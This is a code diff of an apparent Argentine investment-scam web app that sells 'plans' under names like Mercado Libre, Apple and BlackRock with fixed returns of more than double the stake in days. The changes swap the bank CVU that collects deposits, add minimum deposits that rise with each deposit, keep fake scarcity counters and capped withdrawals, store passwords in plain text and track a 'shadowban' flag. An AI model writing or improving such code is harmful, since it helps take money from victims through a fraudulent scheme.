@@ -104,7 +104,7 @@ body.dark-mode .social-ticker {
         <p><strong class="text-amber-500">Plan MELI:</strong> $2.250 ARS diarios ($4.500 total)</p>
       </div>
       <div class="flex items-center gap-2.5">
-        <span class="text-base shrink-0">⏱️️</span>
+        <span class="text-base shrink-0">⏱</span>
         <p><strong class="text-sky-600">Duración ágil:</strong> 2 días de ciclo</p>
       </div>
       <div class="flex items-center gap-2.5">
@@ -200,8 +200,8 @@ body.dark-mode .social-ticker {
         </div>
       </div>
 
-      <button type="button" id="btn-submit-auth" onclick="handleAuthSubmit()" class="w-full meli-btn py-2.5 bg-sky-600 hover:bg-sky-700 text-white shadow-xs mt-2 cursor-pointer">
-        Ingresar al Mercado
+      <button type="button" id="btn-submit-auth" onclick="handleAuthSubmit()" class="w-full meli-btn py-2.5 bg-sky-600 hover:bg-sky-700 text-white shadow-xs mt-2 cursor-pointer flex items-center justify-center gap-2">
+        <span>Ingresar al Mercado</span>
       </button>
     </div>
   </div>
@@ -514,7 +514,7 @@ body.dark-mode .social-ticker {
     </div>
 
     <!-- PREGUNTAS FRECUENTES (FAQ) -->
-    <div class="meli-card bg-white border border-slate-200 rounded-lg p-3.5 space-y-2 text-xs">
+    <div class="meli-card bg-white border border-slate-200 rounded-lg p-3.5 space-y-2.5 text-xs">
       <div class="flex items-center gap-2 border-b border-slate-100 pb-2">
         <i class="fa-solid fa-circle-question text-sky-600"></i>
         <span class="font-bold text-slate-900 text-xs text-main">Preguntas Frecuentes</span>
@@ -581,7 +581,7 @@ body.dark-mode .social-ticker {
   </button>
 </nav>
 
-<!-- MODAL BILLETERA -->
+<!-- MODAL BILLETERA (RECARGA Y RETIRO) -->
 <div id="wallet-modal" class="fixed inset-0 z-50 bg-slate-900/80 backdrop-blur-sm hidden flex items-center justify-center p-3">
   <div class="bg-white border border-slate-200 w-full max-w-sm rounded-xl p-4 shadow-2xl space-y-3.5 text-slate-800 meli-card">
     <div class="flex items-center justify-between border-b border-slate-100 pb-2">
@@ -610,7 +610,7 @@ body.dark-mode .social-ticker {
       <strong id="wallet-available-bal" class="font-mono-num text-base text-slate-900 font-bold">$0 ARS</strong>
     </div>
 
-    <!-- BOX RECARGA -->
+    <!-- BOX RECARGA CON CVU OFICIAL ACTUALIZADO Y ESCALA DINÁMICA -->
     <div id="wallet-recarga-box" style="display: block;" class="space-y-3 text-xs">
       <div class="p-3 bg-slate-50 border border-slate-200 rounded-lg space-y-1">
         <div class="flex justify-between items-center text-[10px] text-slate-400 font-mono-num uppercase">
@@ -618,7 +618,7 @@ body.dark-mode .social-ticker {
           <span class="text-sky-700 font-semibold">Billetera / Banco</span>
         </div>
         <div class="flex items-center justify-between gap-1 pt-0.5">
-          <span id="cvu-text-val" class="font-mono-num font-bold text-xs text-slate-900 select-all">4530000800013866529417</span>
+          <span id="cvu-text-val" class="font-mono-num font-bold text-xs text-slate-900 select-all">0000168300000008340656</span>
           <button id="btn-copy-cvu" onclick="copyOfficialCVU()" class="meli-btn px-2.5 py-1 bg-sky-600 hover:bg-sky-700 text-white text-xs cursor-pointer shrink-0">
             Copiar
           </button>
@@ -627,18 +627,15 @@ body.dark-mode .social-ticker {
 
       <div>
         <label class="text-[11px] text-slate-500 block mb-1">Monto rápido</label>
-        <div class="grid grid-cols-4 gap-1.5 text-xs font-mono-num">
-          <button onclick="setDepositValue(2000)" class="py-2 bg-slate-50 hover:bg-slate-100 rounded-md font-semibold text-slate-800 border border-slate-200 cursor-pointer">2.000</button>
-          <button onclick="setDepositValue(5000)" class="py-2 bg-slate-50 hover:bg-slate-100 rounded-md font-semibold text-slate-800 border border-slate-200 cursor-pointer">5.000</button>
-          <button onclick="setDepositValue(15000)" class="py-2 bg-slate-50 hover:bg-slate-100 rounded-md font-semibold text-slate-800 border border-slate-200 cursor-pointer">15.000</button>
-          <button onclick="setDepositValue(50000)" class="py-2 bg-slate-50 hover:bg-slate-100 rounded-md font-semibold text-slate-800 border border-slate-200 cursor-pointer">50.000</button>
+        <div id="deposit-quick-buttons" class="grid grid-cols-4 gap-1.5 text-xs font-mono-num">
+          <!-- Renderizado dinámico según la etapa operativa -->
         </div>
       </div>
 
       <div>
         <label class="text-[11px] text-slate-500 block mb-1">Monto a cargar</label>
-        <input id="deposit-custom-input" type="number" min="2000" value="2000" class="w-full bg-slate-50 border border-slate-200 rounded-md p-2.5 text-xs font-mono-num font-bold text-slate-900 outline-none">
-        <span class="text-[10px] text-slate-500 block mt-1">Mínimo de recarga: $2.000 ARS</span>
+        <input id="deposit-custom-input" type="number" class="w-full bg-slate-50 border border-slate-200 rounded-md p-2.5 text-xs font-mono-num font-bold text-slate-900 outline-none">
+        <span id="deposit-min-hint" class="text-[10px] text-slate-500 block mt-1">Mínimo de recarga: $2.000 ARS</span>
       </div>
 
       <button id="btn-notify-deposit" onclick="notifyDepositTelegram()" class="w-full meli-btn py-2.5 bg-sky-600 hover:bg-sky-700 text-white shadow-xs flex items-center justify-center gap-1.5 cursor-pointer">
@@ -786,45 +783,45 @@ function isBusinessHours() {
   }
 }
 
-// CATÁLOGO COMPLETO: 12 EXISTENTES + 12 NUEVOS FASE 2
+// CATÁLOGO COMPLETO: 12 EXISTENTES + 12 NUEVOS (24 ACCIONES TOTALES)
 const plans = [
   // 6 EXISTENTES INICIALES
-  { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2250, total: 4500, slotsTotal: 100, slotsLeft: 64, isNew: false, logo: './meli.png' },
-  { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 2333, total: 7000, slotsTotal: 100, slotsLeft: 58, isNew: false, logo: './tiktok.png' },
-  { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 2200, total: 11000, slotsTotal: 100, slotsLeft: 47, isNew: false, logo: './apple.png' },
-  { id: 'spotify', name: 'Spotify (Audio)', cat: 'inicial', cost: 8000, days: 7, daily: 2571, total: 18000, slotsTotal: 100, slotsLeft: 39, isNew: false, logo: './spotify.png' },
-  { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 3000, total: 30000, slotsTotal: 100, slotsLeft: 31, isNew: false, logo: './amazon.png' },
-  { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 15, daily: 2833, total: 42500, slotsTotal: 100, slotsLeft: 22, isNew: false, logo: './netflix.png' },
+  { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2250, total: 4500, slotsTotal: 100, slotsLeft: 64, logo: './meli.png' },
+  { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 2333, total: 7000, slotsTotal: 100, slotsLeft: 58, logo: './tiktok.png' },
+  { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 2200, total: 11000, slotsTotal: 100, slotsLeft: 47, logo: './apple.png' },
+  { id: 'spotify', name: 'Spotify (Audio)', cat: 'inicial', cost: 8000, days: 7, daily: 2571, total: 18000, slotsTotal: 100, slotsLeft: 39, logo: './spotify.png' },
+  { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 3000, total: 30000, slotsTotal: 100, slotsLeft: 31, logo: './amazon.png' },
+  { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 15, daily: 2833, total: 42500, slotsTotal: 100, slotsLeft: 22, logo: './netflix.png' },
 
   // 6 NUEVOS INICIALES FASE 2
-  { id: 'pedidosya', name: 'PedidosYa (Delivery)', cat: 'inicial', cost: 2500, days: 2, daily: 2750, total: 5500, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './pedidosya.png' },
-  { id: 'shein', name: 'SHEIN (E-Commerce)', cat: 'inicial', cost: 4000, days: 3, daily: 2833, total: 8500, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './shein.png' },
-  { id: 'uber', name: 'Uber (Movilidad)', cat: 'inicial', cost: 6000, days: 4, daily: 3250, total: 13000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './uber.png' },
-  { id: 'airbnb', name: 'Airbnb (Turismo)', cat: 'inicial', cost: 9000, days: 6, daily: 3333, total: 20000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './airbnb.png' },
-  { id: 'disney', name: 'Disney+ (Streaming)', cat: 'inicial', cost: 14000, days: 8, daily: 4000, total: 32000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './disney.png' },
-  { id: 'openai', name: 'OpenAI (ChatGPT Pro)', cat: 'inicial', cost: 18000, days: 12, daily: 4000, total: 48000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './openai.png' },
+  { id: 'pedidosya', name: 'PedidosYa (Delivery)', cat: 'inicial', cost: 2500, days: 2, daily: 2750, total: 5500, slotsTotal: 50, slotsLeft: 50, logo: './pedidosya.png' },
+  { id: 'shein', name: 'SHEIN (E-Commerce)', cat: 'inicial', cost: 4000, days: 3, daily: 2833, total: 8500, slotsTotal: 50, slotsLeft: 50, logo: './shein.png' },
+  { id: 'uber', name: 'Uber (Movilidad)', cat: 'inicial', cost: 6000, days: 4, daily: 3250, total: 13000, slotsTotal: 50, slotsLeft: 50, logo: './uber.png' },
+  { id: 'airbnb', name: 'Airbnb (Turismo)', cat: 'inicial', cost: 9000, days: 6, daily: 3333, total: 20000, slotsTotal: 50, slotsLeft: 50, logo: './airbnb.png' },
+  { id: 'disney', name: 'Disney+ (Streaming)', cat: 'inicial', cost: 14000, days: 8, daily: 4000, total: 32000, slotsTotal: 50, slotsLeft: 50, logo: './disney.png' },
+  { id: 'openai', name: 'OpenAI (ChatGPT Pro)', cat: 'inicial', cost: 18000, days: 12, daily: 4000, total: 48000, slotsTotal: 50, slotsLeft: 50, logo: './openai.png' },
 
   // 6 EXISTENTES VIP
-  { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 20, daily: 2500, total: 50000, slotsTotal: 50, slotsLeft: 28, isNew: false, logo: './nvidia.png' },
-  { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 30000, days: 30, daily: 2233, total: 67000, slotsTotal: 50, slotsLeft: 21, isNew: false, logo: './instagram.png' },
-  { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 50000, days: 45, daily: 2555, total: 115000, slotsTotal: 50, slotsLeft: 17, isNew: false, logo: './tesla.png' },
-  { id: 'youtube', name: 'YouTube (Google)', cat: 'pro', cost: 80000, days: 60, daily: 2417, total: 145000, slotsTotal: 50, slotsLeft: 12, isNew: false, logo: './youtube.png' },
-  { id: 'google', name: 'GOOGL (Alphabet)', cat: 'pro', cost: 110000, days: 75, daily: 2667, total: 200000, slotsTotal: 50, slotsLeft: 8, isNew: false, logo: './google.png' },
-  { id: 'microsoft', name: 'MSFT (Microsoft)', cat: 'pro', cost: 200000, days: 100, daily: 9000, total: 900000, slotsTotal: 50, slotsLeft: 5, isNew: false, logo: './microsoft.png' },
+  { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 20, daily: 2500, total: 50000, slotsTotal: 50, slotsLeft: 28, logo: './nvidia.png' },
+  { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 30000, days: 30, daily: 2233, total: 67000, slotsTotal: 50, slotsLeft: 21, logo: './instagram.png' },
+  { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 50000, days: 45, daily: 2555, total: 115000, slotsTotal: 50, slotsLeft: 17, logo: './tesla.png' },
+  { id: 'youtube', name: 'YouTube (Google)', cat: 'pro', cost: 80000, days: 60, daily: 2417, total: 145000, slotsTotal: 50, slotsLeft: 12, logo: './youtube.png' },
+  { id: 'google', name: 'GOOGL (Alphabet)', cat: 'pro', cost: 110000, days: 75, daily: 2667, total: 200000, slotsTotal: 50, slotsLeft: 8, logo: './google.png' },
+  { id: 'microsoft', name: 'MSFT (Microsoft)', cat: 'pro', cost: 200000, days: 100, daily: 9000, total: 900000, slotsTotal: 50, slotsLeft: 5, logo: './microsoft.png' },
 
   // 6 NUEVOS VIP FASE 2
-  { id: 'cocacola', name: 'Coca-Cola (Consumo)', cat: 'pro', cost: 25000, days: 15, daily: 4333, total: 65000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './cocacola.png' },
-  { id: 'playstation', name: 'PlayStation (Sony Gaming)', cat: 'pro', cost: 40000, days: 25, daily: 4600, total: 115000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './playstation.png' },
-  { id: 'visa', name: 'Visa (Fintech Global)', cat: 'pro', cost: 60000, days: 35, daily: 5143, total: 180000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './visa.png' },
-  { id: 'spacex', name: 'SpaceX (Aeroespacial)', cat: 'pro', cost: 90000, days: 45, daily: 6222, total: 280000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './spacex.png' },
-  { id: 'binance', name: 'Binance (Cripto Exchange)', cat: 'pro', cost: 150000, days: 60, daily: 8500, total: 510000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './binance.png' },
-  { id: 'blackrock', name: 'BlackRock (Fondo Institucional)', cat: 'pro', cost: 250000, days: 80, daily: 15000, total: 1200000, slotsTotal: 50, slotsLeft: 50, isNew: true, logo: './blackrock.png' }
+  { id: 'cocacola', name: 'Coca-Cola (Consumo)', cat: 'pro', cost: 25000, days: 15, daily: 4333, total: 65000, slotsTotal: 50, slotsLeft: 50, logo: './cocacola.png' },
+  { id: 'playstation', name: 'PlayStation (Sony Gaming)', cat: 'pro', cost: 40000, days: 25, daily: 4600, total: 115000, slotsTotal: 50, slotsLeft: 50, logo: './playstation.png' },
+  { id: 'visa', name: 'Visa (Fintech Global)', cat: 'pro', cost: 60000, days: 35, daily: 5143, total: 180000, slotsTotal: 50, slotsLeft: 50, logo: './visa.png' },
+  { id: 'spacex', name: 'SpaceX (Aeroespacial)', cat: 'pro', cost: 90000, days: 45, daily: 6222, total: 280000, slotsTotal: 50, slotsLeft: 50, logo: './spacex.png' },
+  { id: 'binance', name: 'Binance (Cripto Exchange)', cat: 'pro', cost: 150000, days: 60, daily: 8500, total: 510000, slotsTotal: 50, slotsLeft: 50, logo: './binance.png' },
+  { id: 'blackrock', name: 'BlackRock (Fondo Institucional)', cat: 'pro', cost: 250000, days: 80, daily: 15000, total: 1200000, slotsTotal: 50, slotsLeft: 50, logo: './blackrock.png' }
 ];
 
 let appState = {
   phone: '', pass: '', name: '', cvu: '', alias: '', bank: '', accountType: '',
   bankVerified: false, hasDeposited: false, firstDepositAt: null, isShadowbanned: false,
-  balance: 0, pending: 0, withdrawn: 0, withdrawCount: 0,
+  balance: 0, pending: 0, withdrawn: 0, withdrawCount: 0, depositCount: 0,
   lastClaim: 0, lastWithdraw: 0, lastWithdrawNet: 0,
   hideBalance: false,
   darkMode: false,
@@ -846,6 +843,7 @@ try {
   appState.pending = parseFloat(localStorage.getItem('cy_pending')) || 0;
   appState.withdrawn = parseFloat(localStorage.getItem('cy_withdrawn')) || 0;
   appState.withdrawCount = parseInt(localStorage.getItem('cy_withdraw_count')) || 0;
+  appState.depositCount = parseInt(localStorage.getItem('cy_deposit_count')) || 0;
   appState.lastClaim = parseInt(localStorage.getItem('cy_claim')) || 0;
   appState.lastWithdraw = parseInt(localStorage.getItem('cy_last_withdraw')) || 0;
   appState.lastWithdrawNet = parseFloat(localStorage.getItem('cy_last_withdraw_net')) || 0;
@@ -956,6 +954,7 @@ function saveLocal() {
     localStorage.setItem('cy_pending', appState.pending);
     localStorage.setItem('cy_withdrawn', appState.withdrawn);
     localStorage.setItem('cy_withdraw_count', appState.withdrawCount);
+    localStorage.setItem('cy_deposit_count', appState.depositCount);
     localStorage.setItem('cy_claim', appState.lastClaim);
     localStorage.setItem('cy_last_withdraw', appState.lastWithdraw);
     localStorage.setItem('cy_last_withdraw_net', appState.lastWithdrawNet);
@@ -1108,19 +1107,37 @@ async function cargarHistorialTransacciones() {
   }
 }
 
-// ESCALA DE RETIRO BLINDADA CONTRA SUPABASE
-async function obtenerTopeRealSupabase() {
-  if (!appState.phone) return 10000;
+// DETERMINAR ESCALA PROGRESIVA DE FONDEO Y RETIRO
+async function obtenerEstadisticasCuenta() {
+  if (!appState.phone) return { retiros: 0, depositos: 0 };
   try {
     const rawPhone = appState.phone.trim();
     const digitsPhone = rawPhone.replace(/\D/g, '');
-    const res = await supabaseRequest(`solicitudes?or=(user_phone.eq.${encodeURIComponent(rawPhone)},user_phone.eq.${encodeURIComponent(digitsPhone)})&type=eq.retiro&status=in.(aprobado,completado)&select=id`);
-    const aprobadosCount = Array.isArray(res) ? res.length : (appState.withdrawCount || 0);
-    const topeCalculado = (aprobadosCount + 1) * 10000;
-    return Math.min(100000, topeCalculado);
+    const resRetiros = await supabaseRequest(`solicitudes?or=(user_phone.eq.${encodeURIComponent(rawPhone)},user_phone.eq.${encodeURIComponent(digitsPhone)})&type=eq.retiro&status=in.(aprobado,completado)&select=id`);
+    const resDepositos = await supabaseRequest(`solicitudes?or=(user_phone.eq.${encodeURIComponent(rawPhone)},user_phone.eq.${encodeURIComponent(digitsPhone)})&type=eq.recarga&status=in.(aprobado,completado)&select=id`);
+
+    const retirosCount = Array.isArray(resRetiros) ? resRetiros.length : (appState.withdrawCount || 0);
+    const depositosCount = Array.isArray(resDepositos) ? resDepositos.length : (appState.depositCount || 0);
+    return { retiros: retirosCount, depositos: depositosCount };
   } catch(e) {
-    return Math.min(100000, ((appState.withdrawCount || 0) + 1) * 10000);
+    return { retiros: appState.withdrawCount || 0, depositos: appState.depositCount || 0 };
   }
+}
+
+// ESCALA: FONDEO 1: $2.000 | 2: $4.500 | 3: $7.000 | 4: $10.000 | 5: $18.000 | 6+: $25.000
+function calcularMinimoFondeo(depCount) {
+  if (depCount <= 0) return 2000;
+  if (depCount === 1) return 4500;
+  if (depCount === 2) return 7000;
+  if (depCount === 3) return 10000;
+  if (depCount === 4) return 18000;
+  return 25000;
+}
+
+// ESCALA: RETIRO 1: $10.000 | 2: $20.000 | 3: $30.000 ... HASTA $100.000
+function calcularTopeRetiro(retCount) {
+  const tope = (retCount + 1) * 10000;
+  return Math.min(100000, tope);
 }
 
 async function sincronizarSaldoServidor() {
@@ -1145,6 +1162,7 @@ async function sincronizarSaldoServidor() {
     if (dbUser.account_type) appState.accountType = dbUser.account_type;
     if (dbUser.withdrawn !== undefined) appState.withdrawn = parseFloat(dbUser.withdrawn) || 0;
     if (dbUser.withdraw_count !== undefined) appState.withdrawCount = parseInt(dbUser.withdraw_count) || 0;
+    if (dbUser.deposit_count !== undefined) appState.depositCount = parseInt(dbUser.deposit_count) || 0;
     if (dbUser.last_claim !== undefined) appState.lastClaim = parseInt(dbUser.last_claim) || 0;
     if (dbUser.has_deposited !== undefined) appState.hasDeposited = dbUser.has_deposited === true;
     if (dbUser.first_deposit_at !== undefined) appState.firstDepositAt = dbUser.first_deposit_at;
@@ -1181,18 +1199,25 @@ async function checkAuth() {
 
 setInterval(sincronizarSaldoServidor, 4000);
 
+// REGISTRO Y LOGIN DESACELERADO CON VERIFICACIÓN OBLIGATORIA EN SUPABASE
 window.handleAuthSubmit = async function() {
-  const phone = document.getElementById('auth-phone').value.trim();
-  const pass = document.getElementById('auth-pass').value;
+  const phoneInput = document.getElementById('auth-phone');
+  const passInput = document.getElementById('auth-pass');
   const submitBtn = document.getElementById('btn-submit-auth');
 
+  const phone = phoneInput.value.trim().replace(/\s+/g, '');
+  const pass = passInput.value.trim();
+
   if (!phone || !pass) {
-    alert("Por favor completa tu teléfono y contraseña.");
+    alert("Por favor completa tu número de teléfono y contraseña.");
     return;
   }
 
   submitBtn.disabled = true;
-  submitBtn.innerText = "Verificando...";
+  submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verificando credenciales...';
+
+  // Pausa deliberada de 1.2 segundos para asegurar sincronización de red
+  await new Promise(r => setTimeout(r, 1200));
 
   let existingUser = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}&select=*`);
   if (!existingUser || existingUser.length === 0) {
@@ -1209,12 +1234,12 @@ window.handleAuthSubmit = async function() {
       return;
     }
 
-    const passConf = document.getElementById('auth-pass-confirm').value;
+    const passConf = document.getElementById('auth-pass-confirm').value.trim();
     const capVal = document.getElementById('auth-captcha-input').value.trim();
     const typedRef = document.getElementById('auth-ref-input').value.trim();
 
     if (pass !== passConf) {
-      alert("Las contraseñas no coinciden.");
+      alert("Las contraseñas ingresadas no coinciden.");
       submitBtn.disabled = false;
       submitBtn.innerText = "Registrarse e Ingresar";
       return;
@@ -1226,23 +1251,41 @@ window.handleAuthSubmit = async function() {
       return;
     }
 
-    const regRes = await supabaseRequest('usuarios', 'POST', {
-      phone: phone, pass: pass, name: '', cvu: '', alias: '', bank: '', account_type: '', balance: 0,
-      withdraw_count: 0, invited_by: typedRef || referredByUrl || null,
-      device_id: currentDeviceId, ip_address: currentClientIp,
-      bank_verified: false, has_deposited: false, first_deposit_at: null, is_shadowbanned: false,
-      active_plans: []
-    });
+    submitBtn.innerHTML = '<i class="fa-solid fa-cloud-arrow-up fa-spin"></i> Registrando usuario en base de datos...';
 
-    if (!regRes) {
-      alert("Error al crear cuenta. Intenta nuevamente.");
+    // Inserción limpia a Supabase
+    const payloadNuevo = {
+      phone: phone,
+      pass: pass,
+      balance: 0,
+      invited_by: typedRef || referredByUrl || null,
+      has_deposited: false,
+      active_plans: []
+    };
+
+    const regRes = await supabaseRequest('usuarios', 'POST', payloadNuevo);
+
+    // Pausa adicional para confirmación de réplica en Supabase
+    await new Promise(r => setTimeout(r, 800));
+
+    // Confirmación doble de existencia en el servidor
+    let confirmacion = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}&select=phone`);
+    if (!confirmacion || confirmacion.length === 0) {
+      alert("Hubo una demora al asentar tu cuenta en el servidor. Presiona nuevamente 'Registrarse e Ingresar'.");
       submitBtn.disabled = false;
       submitBtn.innerText = "Registrarse e Ingresar";
       return;
     }
+
+    appState.balance = 0;
+    appState.withdrawn = 0;
+    appState.withdrawCount = 0;
+    appState.depositCount = 0;
+    appState.hasDeposited = false;
+    appState.activePlans = [];
   } else {
     if (!existingUser || existingUser.length === 0) {
-      alert("No se encontró cuenta con este número. Por favor regístrate.");
+      alert("No se encontró ninguna cuenta vinculada a este número. Por favor regístrate.");
       submitBtn.disabled = false;
       submitBtn.innerText = "Iniciar Sesión";
       return;
@@ -1264,6 +1307,7 @@ window.handleAuthSubmit = async function() {
     appState.accountType = dbUser.account_type || '';
     appState.withdrawn = parseFloat(dbUser.withdrawn) || 0;
     appState.withdrawCount = parseInt(dbUser.withdraw_count) || 0;
+    appState.depositCount = parseInt(dbUser.deposit_count) || 0;
     appState.hasDeposited = dbUser.has_deposited === true;
     appState.firstDepositAt = dbUser.first_deposit_at || null;
     appState.bankVerified = dbUser.bank_verified === true;
@@ -1325,7 +1369,7 @@ document.getElementById('btn-tab-pro').addEventListener('click', () => {
   renderPlans();
 });
 
-// RENDER DE PLANES CON REVELACIÓN POST-FONDEO Y REGLA 168 HORAS
+// RENDER DE PLANES CON REGLA UNIFICADA: 1 COMPRA POR SEMANA (168 HORAS) -> "CUPO CUBIERTO (SIGUIENTE RONDA)"
 function renderPlans() {
   const container = document.getElementById('plans-container');
   container.innerHTML = '';
@@ -1337,7 +1381,7 @@ function renderPlans() {
   filtered.forEach(p => {
     let estaBloqueado168h = false;
 
-    // Regla 168h por plan
+    // Regla de 1 compra semanal por plan (168 hs)
     if (appState.activePlans && appState.activePlans.length > 0) {
       const mismoPlan = appState.activePlans.filter(plan => 
         plan.plan_code === p.id || plan.id === p.id || plan.name === p.name
@@ -1351,30 +1395,10 @@ function renderPlans() {
       }
     }
 
-    // LÓGICA DE CUPOS SEGÚN ESTADO DE FONDEO
-    let cuposTexto = '';
-    let estaAgotado = false;
+    const cuposTexto = `${p.slotsLeft || p.slotsTotal} cupos libres`;
 
-    if (!appState.hasDeposited) {
-      cuposTexto = `${p.slotsTotal} cupos libres`;
-    } else {
-      if (p.isNew) {
-        estaAgotado = true;
-        cuposTexto = `Ronda 1 Culminada`;
-      } else {
-        cuposTexto = `${p.slotsLeft} cupos libres`;
-      }
-    }
-
-    // BOTONES Y ESTILOS
     let btnHtml = '';
-    if (estaAgotado) {
-      btnHtml = `
-        <button onclick="handleAgotadoNotice('${p.name}')" class="w-full meli-btn py-2.5 bg-slate-200 text-slate-500 flex items-center justify-center gap-1.5 cursor-pointer">
-          <i class="fa-solid fa-lock text-xs"></i> Cupos agotados (Próxima ronda)
-        </button>
-      `;
-    } else if (estaBloqueado168h) {
+    if (estaBloqueado168h) {
       btnHtml = `
         <button onclick="handleBloqueo168Notice('${p.name}')" class="w-full meli-btn py-2.5 bg-slate-200 text-slate-500 flex items-center justify-center gap-1.5 cursor-pointer">
           <i class="fa-solid fa-lock text-xs"></i> Cupo cubierto (Siguiente ronda)
@@ -1401,7 +1425,7 @@ function renderPlans() {
           </div>
           <div>
             <h4 class="font-semibold text-slate-900 text-sm leading-tight text-main">${p.name}</h4>
-            <span class="text-xs ${estaAgotado ? 'text-rose-600' : 'text-emerald-700'} font-medium">${cuposTexto}</span>
+            <span class="text-xs text-emerald-700 font-medium">${cuposTexto}</span>
           </div>
         </div>
         <span class="text-[11px] font-semibold text-slate-600 bg-slate-100 px-2 py-0.5 rounded subbox-theme text-main">
@@ -1426,15 +1450,11 @@ function renderPlans() {
   });
 }
 
-window.handleAgotadoNotice = function(planName) {
-  alert(`⚠️ Aviso de Mercado: Los cupos asignados para ${planName} en la presente ronda se encuentran temporalmente agotados por alta demanda. Por favor aguarda a la apertura de la siguiente ronda de suscripción.`);
-};
-
 window.handleBloqueo168Notice = function(planName) {
   alert(`⚠️ Cupo cubierto: Has cubierto tu asignación para el plan ${planName} en la presente ronda. Aguarda a la habilitación de la siguiente ronda de mercado.`);
 };
 
-// ADQUISICIÓN DE PLANES
+// ADQUISICIÓN DE CONTRATOS
 window.handlePlanClick = async function(planId) {
   const p = plans.find(item => item.id === planId);
   if (!p) return;
@@ -1459,7 +1479,7 @@ window.handlePlanClick = async function(planId) {
   await sincronizarSaldoServidor();
 
   if (!appState.hasDeposited) {
-    alert("Requisito de Activación: Tu cartera no posee capital operativo activo. Para suscribir contratos y certificar rendimientos, debes realizar un nuevo depósito oficial ($2.000 ARS).");
+    alert("Requisito de Activación: Tu cartera no posee capital operativo activo. Para suscribir contratos y certificar rendimientos, debes realizar un nuevo depósito oficial.");
     openWalletModal('recargar');
     return;
   }
@@ -1614,7 +1634,7 @@ document.getElementById('btn-claim-daily').addEventListener('click', async () =>
   alert("¡+$500 ARS acumulados a tu saldo! Recuerda que para utilizarlos en compras debes contar con capital operativo activo.");
 });
 
-window.openWalletModal = function(mode) {
+window.openWalletModal = async function(mode) {
   document.getElementById('wallet-modal').classList.remove('hidden');
 
   const destNameEl = document.getElementById('withdraw-dest-name');
@@ -1623,9 +1643,42 @@ window.openWalletModal = function(mode) {
   if (destCvuEl && appState.cvu) destCvuEl.value = appState.cvu;
 
   cancelarRevisionRetiro();
+  await actualizarOpcionesFondeoDinamicas();
   setWalletMode(mode);
 };
 window.closeWalletModal = () => document.getElementById('wallet-modal').classList.add('hidden');
+
+async function actualizarOpcionesFondeoDinamicas() {
+  const stats = await obtenerEstadisticasCuenta();
+  const minRequired = calcularMinimoFondeo(stats.depositos);
+
+  const depInput = document.getElementById('deposit-custom-input');
+  const depHint = document.getElementById('deposit-min-hint');
+  const quickBox = document.getElementById('deposit-quick-buttons');
+
+  if (depInput) {
+    depInput.min = minRequired;
+    depInput.value = minRequired;
+  }
+  if (depHint) {
+    depHint.innerText = `Mínimo de recarga para tu etapa operativa: $${fmt(minRequired)} ARS`;
+  }
+
+  // Generar botones rápidos según la etapa de fondeo del usuario
+  if (quickBox) {
+    let b1 = minRequired;
+    let b2 = Math.round(minRequired * 1.5 / 1000) * 1000;
+    let b3 = Math.round(minRequired * 2.5 / 1000) * 1000;
+    let b4 = Math.round(minRequired * 4.0 / 1000) * 1000;
+
+    quickBox.innerHTML = `
+      <button onclick="setDepositValue(${b1})" class="py-2 bg-slate-50 hover:bg-slate-100 rounded-md font-semibold text-slate-800 border border-slate-200 cursor-pointer">${fmt(b1)}</button>
+      <button onclick="setDepositValue(${b2})" class="py-2 bg-slate-50 hover:bg-slate-100 rounded-md font-semibold text-slate-800 border border-slate-200 cursor-pointer">${fmt(b2)}</button>
+      <button onclick="setDepositValue(${b3})" class="py-2 bg-slate-50 hover:bg-slate-100 rounded-md font-semibold text-slate-800 border border-slate-200 cursor-pointer">${fmt(b3)}</button>
+      <button onclick="setDepositValue(${b4})" class="py-2 bg-slate-50 hover:bg-slate-100 rounded-md font-semibold text-slate-800 border border-slate-200 cursor-pointer">${fmt(b4)}</button>
+    `;
+  }
+}
 
 window.setWalletMode = function(mode) {
   const btnRec = document.getElementById('wallet-tab-recargar');
@@ -1647,7 +1700,7 @@ window.setWalletMode = function(mode) {
 };
 
 window.copyOfficialCVU = function() {
-  navigator.clipboard.writeText("4530000800013866529417").then(() => {
+  navigator.clipboard.writeText("0000168300000008340656").then(() => {
     const btn = document.getElementById('btn-copy-cvu');
     btn.innerText = "¡Copiado! ✓";
     setTimeout(() => { btn.innerText = "Copiar"; }, 1500);
@@ -1661,9 +1714,12 @@ window.notifyDepositTelegram = async function() {
   const inputEl = document.getElementById('deposit-custom-input');
   const val = parseFloat(inputEl.value);
 
-  if (isNaN(val) || val < 2000) {
